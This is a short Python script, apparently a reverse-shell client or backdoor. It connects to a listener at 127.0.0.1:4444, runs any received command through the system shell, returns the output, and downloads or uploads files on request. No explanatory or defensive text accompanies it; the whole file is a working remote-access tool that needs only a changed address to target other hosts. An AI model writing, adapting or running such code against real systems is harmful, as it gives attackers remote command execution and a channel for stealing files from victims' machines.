import socket
import subprocess
from pathlib import Path

LHOST = '127.0.0.1'
LPORT = 4444

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((LHOST, LPORT))

#sending client hello
msg = "CLIENT HELLO"
cs.send(msg.encode())
msg = cs.recv(1024).decode()

while msg!='quit':
    msg = list(msg.split(" "))
    if msg[0] == 'download':
        filename = msg[1]
        f = open(filename, 'rb')
        contents = f.read()
        f.close()
        cs.send(contents)
        msg = cs.recv(1024).decode()
    elif msg[0] =='upload':
        filename = msg[1]
        filesize = msg[2]
        contents = cs.recv(int(filesize))
        with open(filename, "wb") as f:
            f.write(contents)
            cs.send("Received file!".encode())
            msg = cs.recv(1024).decode()
    else: 
        p = subprocess.Popen(
            msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )
        output, error = p.communicate()
        if (len(output) > 0):
            msg = str(output.decode())
        else:
            msg = str(error.decode())
            
        cs.send(msg.encode())
        #recv another cmd
        msg = cs.recv(1024).decode()
    if len(msg) <=0:
        print("Connection closed by remote host")
        break
    else:
        print(msg)
    
cs.close()